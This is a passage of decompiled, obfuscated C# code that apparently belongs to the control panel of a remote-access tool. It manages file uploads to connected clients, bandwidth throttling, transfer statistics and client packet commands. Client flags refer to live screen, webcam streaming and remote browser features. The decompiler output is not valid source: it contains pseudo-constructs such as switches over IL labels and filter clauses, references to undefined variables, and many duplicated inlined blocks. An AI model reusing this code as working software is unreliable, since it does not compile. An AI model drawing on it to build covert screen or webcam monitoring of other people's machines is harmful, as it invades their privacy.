													Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
													Class130.fTransferManager_0.method_26();
													Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
													cclient2.FILE_TRANSFER_COMPLETED = true;
													Class130.long_3 -= 1L;
													if (Class130.long_3 < 0L)
													{
														Class130.long_3 = 0L;
													}
													goto IL_DF2C;
												}
												fileStream = new FileStream(cclient2.FILE_TRANSFER_LOCAL_FILE, FileMode.Open, FileAccess.Read);
											}
											try
											{
												byte[] array13 = new byte[checked(cclient2.sock_async.socket_0.ReceiveBufferSize + 1)];
												int num117 = 0;
												long num118 = 0L;
												Class136.Struct27 @struct = default(Class136.Struct27);
												@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
												bool flag4 = false;
												if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
												{
													flag4 = true;
												}
												long num24;
												if (flag4)
												{
													num24 = Class136.GetTickCount64();
												}
												else
												{
													num24 = (long)Class136.GetTickCount();
												}
												long num119 = num24;
												int num120 = 0;
												do
												{
													num117 = fileStream.Read(array13, 0, array13.Length);
													long num121 = (long)(checked(Class135.smethod_0().MaxBandwidthRateOut * 1024));
													if (num117 > 0)
													{
														checked
														{
															array13 = (byte[])Utils.CopyArray(array13, new byte[num117 - 1 + 1]);
															num118 += unchecked((long)num117);
															cclient2.sock_async.method_6(array13);
															ptr2 = ref Class130.struct20_0.double_3;
														}
														Class130.struct20_0.double_3 = ptr2 + (double)array13.Length;
														CClient cclient191 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
														ptr2 = ref cclient191.stats_bytes_out;
														cclient191.stats_bytes_out = ptr2 + (double)array13.Length;
														CClient cclient192 = cclient2;
														ptr2 = ref cclient192.FILE_TRANSFER_SPEED_COUNTER;
														cclient192.FILE_TRANSFER_SPEED_COUNTER = ptr2 + (double)array13.Length;
														if ((double)Class136.smethod_36() - (double)cclient2.FILE_TRANSFER_LAST_PACKET > 1000.0)
														{
															cclient2.FILE_TRANSFER_ELAPSED = (double)cclient2.FILE_TRANSFER_LAST_PACKET - cclient2.FILE_TRANSFER_STARTED;
															cclient2.FILE_TRANSFER_SPEED_AVG = (double)num118 / (cclient2.FILE_TRANSFER_ELAPSED / 1000.0);
															long long_2 = checked((long)Math.Round(unchecked(Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE) - (double)num118) / cclient2.FILE_TRANSFER_SPEED_AVG));
															fTransferManager fTransferManager_23 = Class130.fTransferManager_0;
															string file_TRANSFER_ID23 = cclient2.FILE_TRANSFER_ID;
															int num122 = 2;
															double num123 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
															bool flag3 = false;
															ref bool ptr10 = ref flag3;
															double num28 = num123;
															int num124 = num122;
															string string_64 = file_TRANSFER_ID23;
															fTransferManager fTransferManager25 = fTransferManager_23;
															string text6;
															object obj47;
															try
															{
																ProjectData.ClearProjectError();
																num30 = 2;
																string text5 = string.Empty;
																if (num28 >= 1099511627776.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
																}
																else if (num28 >= 1073741824.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
																}
																else if (num28 >= 1048576.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
																}
																else if (num28 >= 1024.0)
																{
																	text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
																}
																else if (num28 < 1024.0)
																{
																	text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
																}
																if (ptr10)
																{
																	text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
																}
																if (text5.Length > 0)
																{
																	text6 = text5;
																}
																else
																{
																	text6 = " 0 B";
																}
																IL_A5CC:
																goto IL_A614;
																IL_A5CE:
																text6 = "0 B";
																goto IL_A5CC;
																IL_A5D7:
																num31 = -1;
																@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
																IL_A5ED:
																goto IL_AE76;
															}
															catch when (endfilter(obj47 is Exception & num30 != 0 & num31 == 0))
															{
																Exception ex75 = (Exception)obj48;
																goto IL_A5D7;
															}
															IL_A614:
															if (num31 != 0)
															{
																ProjectData.ClearProjectError();
															}
															string string_65 = text6;
															fTransferManager25.method_16(string_64, num124, string_65);
															fTransferManager fTransferManager_24 = Class130.fTransferManager_0;
															string file_TRANSFER_ID24 = cclient2.FILE_TRANSFER_ID;
															int num125 = 3;
															double num126 = (double)num118;
															flag3 = false;
															ptr10 = ref flag3;
															num28 = num126;
															int num127 = num125;
															string string_66 = file_TRANSFER_ID24;
															fTransferManager fTransferManager26 = fTransferManager_24;
															object obj49;
															try
															{
																ProjectData.ClearProjectError();
																num30 = 2;
																string text5 = string.Empty;
																if (num28 >= 1099511627776.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
																}
																else if (num28 >= 1073741824.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
																}
																else if (num28 >= 1048576.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
																}
																else if (num28 >= 1024.0)
																{
																	text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
																}
																else if (num28 < 1024.0)
																{
																	text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
																}
																if (ptr10)
																{
																	text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
																}
																if (text5.Length > 0)
																{
																	text6 = text5;
																}
																else
																{
																	text6 = " 0 B";
																}
																IL_A7C8:
																goto IL_A810;
																IL_A7CA:
																text6 = "0 B";
																goto IL_A7C8;
																IL_A7D3:
																num31 = -1;
																@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
																IL_A7E9:
																goto IL_AE81;
															}
															catch when (endfilter(obj49 is Exception & num30 != 0 & num31 == 0))
															{
																Exception ex76 = (Exception)obj50;
																goto IL_A7D3;
															}
															IL_A810:
															if (num31 != 0)
															{
																ProjectData.ClearProjectError();
															}
															string str41 = text6;
															fTransferManager26.method_16(string_66, num127, str41 + " (" + Conversions.ToString(Math.Round((double)num118 / Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE) * 100.0, 2)) + "%)");
															fTransferManager fTransferManager_25 = Class130.fTransferManager_0;
															string file_TRANSFER_ID25 = cclient2.FILE_TRANSFER_ID;
															int num128 = 4;
															double file_TRANSFER_SPEED_COUNTER2 = cclient2.FILE_TRANSFER_SPEED_COUNTER;
															flag3 = false;
															ptr10 = ref flag3;
															num28 = file_TRANSFER_SPEED_COUNTER2;
															int num129 = num128;
															string text17 = file_TRANSFER_ID25;
															fTransferManager fTransferManager27 = fTransferManager_25;
															object obj51;
															try
															{
																ProjectData.ClearProjectError();
																num30 = 2;
																string text5 = string.Empty;
																if (num28 >= 1099511627776.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
																}
																else if (num28 >= 1073741824.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
																}
																else if (num28 >= 1048576.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
																}
																else if (num28 >= 1024.0)
																{
																	text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
																}
																else if (num28 < 1024.0)
																{
																	text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
																}
																if (ptr10)
																{
																	text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
																}
																if (text5.Length > 0)
																{
																	text6 = text5;
																}
																else
																{
																	text6 = " 0 B";
																}
																IL_A9FC:
																goto IL_AA44;
																IL_A9FE:
																text6 = "0 B";
																goto IL_A9FC;
																IL_AA07:
																num31 = -1;
																@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
																IL_AA1D:
																goto IL_AE8C;
															}
															catch when (endfilter(obj51 is Exception & num30 != 0 & num31 == 0))
															{
																Exception ex77 = (Exception)obj52;
																goto IL_AA07;
															}
															IL_AA44:
															if (num31 != 0)
															{
																ProjectData.ClearProjectError();
															}
															string text18 = text6;
															fTransferManager fTransferManager28 = fTransferManager27;
															string text19 = text17;
															int num130 = num129;
															string text20 = text18;
															string text21 = "/s (Avg. ";
															double file_TRANSFER_SPEED_AVG2 = cclient2.FILE_TRANSFER_SPEED_AVG;
															flag3 = false;
															ptr10 = ref flag3;
															num28 = file_TRANSFER_SPEED_AVG2;
															string str42 = text21;
															string str43 = text20;
															int num131 = num130;
															string string_67 = text19;
															fTransferManager fTransferManager29 = fTransferManager28;
															object obj53;
															try
															{
																ProjectData.ClearProjectError();
																num30 = 2;
																string text5 = string.Empty;
																if (num28 >= 1099511627776.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
																}
																else if (num28 >= 1073741824.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
																}
																else if (num28 >= 1048576.0)
																{
																	text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
																}
																else if (num28 >= 1024.0)
																{
																	text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
																}
																else if (num28 < 1024.0)
																{
																	text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
																}
																if (ptr10)
																{
																	text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
																}
																if (text5.Length > 0)
																{
																	text6 = text5;
																}
																else
																{
																	text6 = " 0 B";
																}
																IL_ABF3:
																goto IL_AC3B;
																IL_ABF5:
																text6 = "0 B";
																goto IL_ABF3;
																IL_ABFE:
																num31 = -1;
																@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
																IL_AC14:
																goto IL_AE97;
															}
															catch when (endfilter(obj53 is Exception & num30 != 0 & num31 == 0))
															{
																Exception ex78 = (Exception)obj54;
																goto IL_ABFE;
															}
															IL_AC3B:
															if (num31 != 0)
															{
																ProjectData.ClearProjectError();
															}
															string str44 = text6;
															fTransferManager29.method_16(string_67, num131, str43 + str42 + str44 + "/s)");
															Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 6, Class136.smethod_35(checked((long)Math.Round(cclient2.FILE_TRANSFER_ELAPSED / 1000.0)), true));
															Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, Class136.smethod_35(long_2, true));
															Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
															fMain ff17 = cclient2.ff;
															CClient cclient193 = cclient2;
															ptr11 = ref cclient193.FILE_TRANSFER_USER_KEY;
															value3 = cclient193.FILE_TRANSFER_USER_KEY;
															ff17.method_24(ref value3);
															ptr11 = Conversions.ToString(value3);
															cclient2.FILE_TRANSFER_SPEED_COUNTER = 0.0;
															cclient2.FILE_TRANSFER_LAST_PACKET = Class136.smethod_36();
														}
														if (num121 > 0L)
														{
															checked
															{
																num120 += num117;
															}
															if ((long)num120 >= checked(num121 - unchecked((long)num117)))
															{
																@struct = default(Class136.Struct27);
																@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
																flag4 = false;
																if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
																{
																	flag4 = true;
																}
																if (flag4)
																{
																	num24 = Class136.GetTickCount64();
																}
																else
																{
																	num24 = (long)Class136.GetTickCount();
																}
																if (checked(num24 - num119) < 1000L)
																{
																	long num132 = 1000L;
																	@struct = default(Class136.Struct27);
																	@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
																	flag4 = false;
																	if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
																	{
																		flag4 = true;
																	}
																	if (flag4)
																	{
																		num24 = Class136.GetTickCount64();
																	}
																	else
																	{
																		num24 = (long)Class136.GetTickCount();
																	}
																	long num133 = num24;
																	Thread.Sleep(checked((int)(num132 - (num133 - num119))));
																}
																num120 = 0;
																@struct = default(Class136.Struct27);
																@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
																flag4 = false;
																if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
																{
																	flag4 = true;
																}
																if (flag4)
																{
																	num24 = Class136.GetTickCount64();
																}
																else
																{
																	num24 = (long)Class136.GetTickCount();
																}
																num119 = num24;
																Thread.Sleep(1);
															}
														}
													}
													Thread.Sleep(1);
												}
												while (num117 > 0 & Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE);
												fileStream.Close();
												goto IL_AEB3;
												IL_AE76:
												throw ProjectData.CreateProjectError(-2146828237);
												IL_AE81:
												throw ProjectData.CreateProjectError(-2146828237);
												IL_AE8C:
												throw ProjectData.CreateProjectError(-2146828237);
												IL_AE97:
												throw ProjectData.CreateProjectError(-2146828237);
											}
											finally
											{
												((IDisposable)fileStream).Dispose();
											}
											IL_AEB3:;
										}
									}
									catch (Exception ex79)
									{
										CClient cclient194 = cclient2;
										bool flag3 = false;
										cclient194.SOCKET_DISCONNECT(ref flag3);
									}
									return;
								}
								if (Operators.CompareString(left, "FL_UP_FAILED", true) == 0)
								{
									try
									{
										string[] array9;
										bool flag5;
										checked
										{
											Class130.long_3 -= 1L;
											if (Class130.long_3 < 0L)
											{
												Class130.long_3 = 0L;
											}
											cclient2.FILE_TRANSFER_ID = "i" + cclient2.mSocketCounter;
											array9 = Strings.Split(text14, "|", 7, CompareMethod.Text);
											cclient2.FILE_TRANSFER_USER_KEY = array9[1];
											cclient2.FILE_TRANSFER_USER = array9[2];
											cclient2.FILE_TRANSFER_LOCAL_FILE = Encoding.UTF8.GetString(Convert.FromBase64String(array9[3]));
											cclient2.FILE_TRANSFER_FILESIZE = Conversions.ToString(Class136.smethod_32(ref cclient2.FILE_TRANSFER_LOCAL_FILE));
											cclient2.FILE_TRANSFER_LAST_PACKET = Class136.smethod_36();
											cclient2.FILE_TRANSFER_STARTED = (double)Class136.smethod_36();
											cclient2.FILE_TRANSFER_GROUP_ID = array9[4];
											string key = cclient2.FILE_TRANSFER_USER_KEY;
											try
											{
												flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
												goto IL_AFD3;
											}
											catch (Exception ex80)
											{
											}
											flag5 = false;
											IL_AFD3:;
										}
										if (!flag5)
										{
											CClient cclient195 = cclient2;
											bool flag3 = false;
											cclient195.SOCKET_DISCONNECT(ref flag3);
										}
										else
										{
											cclient2.FILE_TRANSFER_ACTIVE = false;
											Class130.fTransferManager_0.method_12(cclient2.FILE_TRANSFER_ID, cclient2.sKey, cclient2.FILE_TRANSFER_USER_KEY, cclient2.FILE_TRANSFER_LOCAL_FILE, cclient2.FILE_TRANSFER_USER, cclient2.FILE_TRANSFER_GROUP_ID);
											fTransferManager fTransferManager_26 = Class130.fTransferManager_0;
											string file_TRANSFER_ID26 = cclient2.FILE_TRANSFER_ID;
											int num134 = 2;
											double num135 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
											bool flag3 = false;
											ref bool ptr10 = ref flag3;
											double num28 = num135;
											int num136 = num134;
											string string_68 = file_TRANSFER_ID26;
											fTransferManager fTransferManager30 = fTransferManager_26;
											string text6;
											object obj55;
											try
											{
												ProjectData.ClearProjectError();
												num30 = 2;
												string text5 = string.Empty;
												if (num28 >= 1099511627776.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
												}
												else if (num28 >= 1073741824.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
												}
												else if (num28 >= 1048576.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
												}
												else if (num28 >= 1024.0)
												{
													text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
												}
												else if (num28 < 1024.0)
												{
													text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
												}
												if (ptr10)
												{
													text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
												}
												if (text5.Length > 0)
												{
													text6 = text5;
												}
												else
												{
													text6 = " 0 B";
												}
												IL_B1C6:
												goto IL_B216;
												IL_B1C8:
												text6 = "0 B";
												goto IL_B1C6;
												IL_B1D1:
												num31 = -1;
												@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
												IL_B1E7:;
											}
											catch when (endfilter(obj55 is Exception & num30 != 0 & num31 == 0))
											{
												Exception ex81 = (Exception)obj56;
												goto IL_B1D1;
											}
											throw ProjectData.CreateProjectError(-2146828237);
											IL_B216:
											if (num31 != 0)
											{
												ProjectData.ClearProjectError();
											}
											string string_69 = text6;
											fTransferManager30.method_16(string_68, num136, string_69);
											fTransferManager fTransferManager_27 = Class130.fTransferManager_0;
											string file_TRANSFER_ID27 = cclient2.FILE_TRANSFER_ID;
											int num137 = 3;
											double num138 = 0.0;
											flag3 = false;
											ptr10 = ref flag3;
											num28 = num138;
											int num139 = num137;
											string string_70 = file_TRANSFER_ID27;
											fTransferManager fTransferManager31 = fTransferManager_27;
											object obj57;
											try
											{
												ProjectData.ClearProjectError();
												num30 = 2;
												string text5 = string.Empty;
												if (num28 >= 1099511627776.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
												}
												else if (num28 >= 1073741824.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
												}
												else if (num28 >= 1048576.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
												}
												else if (num28 >= 1024.0)
												{
													text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
												}
												else if (num28 < 1024.0)
												{
													text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
												}
												if (ptr10)
												{
													text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
												}
												if (text5.Length > 0)
												{
													text6 = text5;
												}
												else
												{
													text6 = " 0 B";
												}
												IL_B3D0:
												goto IL_B420;
												IL_B3D2:
												text6 = "0 B";
												goto IL_B3D0;
												IL_B3DB:
												num31 = -1;
												@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
												IL_B3F1:;
											}
											catch when (endfilter(obj57 is Exception & num30 != 0 & num31 == 0))
											{
												Exception ex82 = (Exception)obj58;
												goto IL_B3DB;
											}
											throw ProjectData.CreateProjectError(-2146828237);
											IL_B420:
											if (num31 != 0)
											{
												ProjectData.ClearProjectError();
											}
											string str45 = text6;
											fTransferManager31.method_16(string_70, num139, str45 + " (0%)");
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 4, "N/A");
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Failed (" + array9[5] + ")");
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
											Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
											ref double ptr2 = ref Class130.struct20_0.double_2;
											Class130.struct20_0.double_2 = ptr2 + (double)num;
											ptr2 = ref Class130.struct20_0.double_4;
											Class130.struct20_0.double_4 = ptr2 + 1.0;
											CClient cclient196 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
											ptr2 = ref cclient196.stats_bytes_in;
											cclient196.stats_bytes_in = ptr2 + (double)num;
											Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
											Class130.fTransferManager_0.method_26();
											stringBuilder.Clear();
											CClient cclient197 = cclient2;
											flag3 = false;
											cclient197.SOCKET_DISCONNECT(ref flag3);
										}
									}
									catch (Exception ex83)
									{
										CClient cclient198 = cclient2;
										bool flag3 = false;
										cclient198.SOCKET_DISCONNECT(ref flag3);
									}
									return;
								}
								if (Operators.CompareString(left, "FL_UP_EXISTS", true) == 0)
								{
									try
									{
										string[] array9;
										bool flag5;
										checked
										{
											Class130.long_3 -= 1L;
											if (Class130.long_3 < 0L)
											{
												Class130.long_3 = 0L;
											}
											cclient2.FILE_TRANSFER_ID = "i" + cclient2.mSocketCounter;
											array9 = Strings.Split(text14, "|", 7, CompareMethod.Text);
											cclient2.FILE_TRANSFER_USER_KEY = array9[1];
											cclient2.FILE_TRANSFER_USER = array9[2];
											cclient2.FILE_TRANSFER_LOCAL_FILE = Encoding.UTF8.GetString(Convert.FromBase64String(array9[3]));
											cclient2.FILE_TRANSFER_FILESIZE = Conversions.ToString(Class136.smethod_32(ref cclient2.FILE_TRANSFER_LOCAL_FILE));
											cclient2.FILE_TRANSFER_LAST_PACKET = Class136.smethod_36();
											cclient2.FILE_TRANSFER_STARTED = (double)Class136.smethod_36();
											cclient2.FILE_TRANSFER_GROUP_ID = array9[4];
											string key = cclient2.FILE_TRANSFER_USER_KEY;
											try
											{
												flag5 = Class130.concurrentDictionary_3.ContainsKey(key);
												goto IL_B646;
											}
											catch (Exception ex84)
											{
											}
											flag5 = false;
											IL_B646:;
										}
										if (!flag5)
										{
											CClient cclient199 = cclient2;
											bool flag3 = false;
											cclient199.SOCKET_DISCONNECT(ref flag3);
										}
										else
										{
											cclient2.FILE_TRANSFER_ACTIVE = false;
											Class130.fTransferManager_0.method_12(cclient2.FILE_TRANSFER_ID, cclient2.sKey, cclient2.FILE_TRANSFER_USER_KEY, cclient2.FILE_TRANSFER_LOCAL_FILE, cclient2.FILE_TRANSFER_USER, cclient2.FILE_TRANSFER_GROUP_ID);
											fTransferManager fTransferManager_28 = Class130.fTransferManager_0;
											string file_TRANSFER_ID28 = cclient2.FILE_TRANSFER_ID;
											int num140 = 2;
											double num141 = Conversions.ToDouble(cclient2.FILE_TRANSFER_FILESIZE);
											bool flag3 = false;
											ref bool ptr10 = ref flag3;
											double num28 = num141;
											int num142 = num140;
											string string_71 = file_TRANSFER_ID28;
											fTransferManager fTransferManager32 = fTransferManager_28;
											string text6;
											object obj59;
											try
											{
												ProjectData.ClearProjectError();
												num30 = 2;
												string text5 = string.Empty;
												if (num28 >= 1099511627776.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
												}
												else if (num28 >= 1073741824.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
												}
												else if (num28 >= 1048576.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
												}
												else if (num28 >= 1024.0)
												{
													text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
												}
												else if (num28 < 1024.0)
												{
													text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
												}
												if (ptr10)
												{
													text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
												}
												if (text5.Length > 0)
												{
													text6 = text5;
												}
												else
												{
													text6 = " 0 B";
												}
												IL_B839:
												goto IL_B889;
												IL_B83B:
												text6 = "0 B";
												goto IL_B839;
												IL_B844:
												num31 = -1;
												@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
												IL_B85A:;
											}
											catch when (endfilter(obj59 is Exception & num30 != 0 & num31 == 0))
											{
												Exception ex85 = (Exception)obj60;
												goto IL_B844;
											}
											throw ProjectData.CreateProjectError(-2146828237);
											IL_B889:
											if (num31 != 0)
											{
												ProjectData.ClearProjectError();
											}
											string string_72 = text6;
											fTransferManager32.method_16(string_71, num142, string_72);
											fTransferManager fTransferManager_29 = Class130.fTransferManager_0;
											string file_TRANSFER_ID29 = cclient2.FILE_TRANSFER_ID;
											int num143 = 3;
											double num144 = 0.0;
											flag3 = false;
											ptr10 = ref flag3;
											num28 = num144;
											int num145 = num143;
											string string_73 = file_TRANSFER_ID29;
											fTransferManager fTransferManager33 = fTransferManager_29;
											object obj61;
											try
											{
												ProjectData.ClearProjectError();
												num30 = 2;
												string text5 = string.Empty;
												if (num28 >= 1099511627776.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
												}
												else if (num28 >= 1073741824.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
												}
												else if (num28 >= 1048576.0)
												{
													text5 = Strings.Format(num28 / 1024.0 / 1024.0, "#0.00") + " MiB";
												}
												else if (num28 >= 1024.0)
												{
													text5 = Strings.Format(num28 / 1024.0, "#0.00") + " KiB";
												}
												else if (num28 < 1024.0)
												{
													text5 = Conversions.ToString(Conversion.Fix(num28)) + " B";
												}
												if (ptr10)
												{
													text5 = Strings.Split(text5, " ", -1, CompareMethod.Text)[0];
												}
												if (text5.Length > 0)
												{
													text6 = text5;
												}
												else
												{
													text6 = " 0 B";
												}
												IL_BA43:
												goto IL_BA93;
												IL_BA45:
												text6 = "0 B";
												goto IL_BA43;
												IL_BA4E:
												num31 = -1;
												@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num30);
												IL_BA64:;
											}
											catch when (endfilter(obj61 is Exception & num30 != 0 & num31 == 0))
											{
												Exception ex86 = (Exception)obj62;
												goto IL_BA4E;
											}
											throw ProjectData.CreateProjectError(-2146828237);
											IL_BA93:
											if (num31 != 0)
											{
												ProjectData.ClearProjectError();
											}
											string str46 = text6;
											fTransferManager33.method_16(string_73, num145, str46 + " (0%)");
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 4, "N/A");
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 5, "Ignored (" + array9[5] + ")");
											Class130.fTransferManager_0.method_16(cclient2.FILE_TRANSFER_ID, 7, "N/A");
											Class130.concurrentDictionary_0[cclient2.FILE_TRANSFER_ID].TRANSFER_ACTIVE = false;
											ref double ptr2 = ref Class130.struct20_0.double_2;
											Class130.struct20_0.double_2 = ptr2 + (double)num;
											ptr2 = ref Class130.struct20_0.double_4;
											Class130.struct20_0.double_4 = ptr2 + 1.0;
											CClient cclient200 = Class130.concurrentDictionary_3[cclient2.FILE_TRANSFER_USER_KEY];
											ptr2 = ref cclient200.stats_bytes_in;
											cclient200.stats_bytes_in = ptr2 + (double)num;
											Class130.fTransferManager_0.method_17(cclient2.FILE_TRANSFER_ID);
											Class130.fTransferManager_0.method_26();
											stringBuilder.Clear();
											CClient cclient201 = cclient2;
											flag3 = false;
											cclient201.SOCKET_DISCONNECT(ref flag3);
										}
									}
									catch (Exception ex87)
									{
										CClient cclient202 = cclient2;
										bool flag3 = false;
										cclient202.SOCKET_DISCONNECT(ref flag3);
									}
									return;
								}
								if (!cclient2.FILE_TRANSFER_ACTIVE & !cclient2.SCREENLIVE_ACTIVE & !cclient2.SCREENLIVE_SECONDARY_ACTIVE & !cclient2.SCREEN_PREVIEW_ACTIVE & !cclient2.WEBCAM_PREVIEW_ACTIVE & !cclient2.WEBCAMSTREAM_ACTIVE & !cclient2.REMOTE_BROWSER_ACTIVE & !cclient2.SOCKET_COMMAND_ACTIVE)
								{
									if (!cclient2.bIsAuthenticated && !text14.StartsWith("con"))
									{
										CClient cclient203 = cclient2;
										bool flag3 = false;
										cclient203.SOCKET_DISCONNECT(ref flag3);
										return;
									}
									CClient cclient204 = cclient2;
									ref string ptr13 = ref text14;
									CClient cclient205 = cclient204;
									bool flag8;
									try
									{
										cclient205.sPacket.Append(ptr13);
										if (cclient205.sPacket.ToString().EndsWith("@"))
										{
											string[] array14 = Strings.Split(cclient205.sPacket.ToString(), "@", -1, CompareMethod.Text);
											long num146 = (long)(checked(array14.Length - 1));
											long num147 = 0L;
											checked
											{
												long num170;
												while (num147 <= num146)
												{
													if (array14[(int)num147].Length <= 0)
													{
														goto IL_DE1F;
													}
													if (array14[(int)num147].Contains("|"))
													{
														CClient cclient206 = cclient205;
														ref string ptr14 = ref array14[(int)num147];
														CClient cclient207 = cclient206;
														CClient.Class152 class5 = new CClient.Class152();
														class5.cclient_0 = cclient207;
														if (ptr14.EndsWith("@"))
														{
															ptr14 = ptr14.Remove(ptr14.Length - 1);
														}
														string[] array15 = Strings.Split(ptr14, "|", 4, CompareMethod.Text);
														fMain ff18 = cclient207.ff;
														CClient cclient208 = cclient207;
														long num148 = Class136.smethod_36();
														string[] array16 = array15;
														int num149 = 1;
														ref string ptr15 = ref array16[num149];
														long value4 = Conversions.ToLong(array16[num149]);
														ff18.method_19(ref cclient208, ref num148, ref value4);
														ptr15 = Conversions.ToString(value4);
														try
														{
															CClient.Class151 class6 = new CClient.Class151();
															class6.class152_0 = class5;
															class6.byte_0 = Convert.FromBase64String(array15[3]);
															class6.class152_0.string_0 = Strings.Split(Encoding.UTF8.GetString(Convert.FromBase64String(array15[3])), "|", -1, CompareMethod.Text);
															long num150 = Conversions.ToLong(array15[2]);
															string left3 = Strings.LCase(array15[0]);
															if (Operators.CompareString(left3, "cli_sleep", true) == 0)
															{
																if (Conversion.Val(class6.class152_0.string_0[0]) == 0.0)
																{
																	cclient207.pending_dc = false;
																	cclient207.pending_dc_timeout = false;
																	cclient207.bJustConnected = false;
																}
															}
															else if (Operators.CompareString(left3, "cli_hib", true) == 0)
															{
																if (Conversion.Val(class6.class152_0.string_0[0]) == 0.0)
																{
																	cclient207.pending_dc = false;
																	cclient207.pending_dc_timeout = false;
																	cclient207.bJustConnected = false;
																}
															}
															else if (Operators.CompareString(left3, "cli_log", true) == 0)
															{
																if (Conversion.Val(class6.class152_0.string_0[0]) == 0.0)
																{
																	cclient207.pending_dc = false;
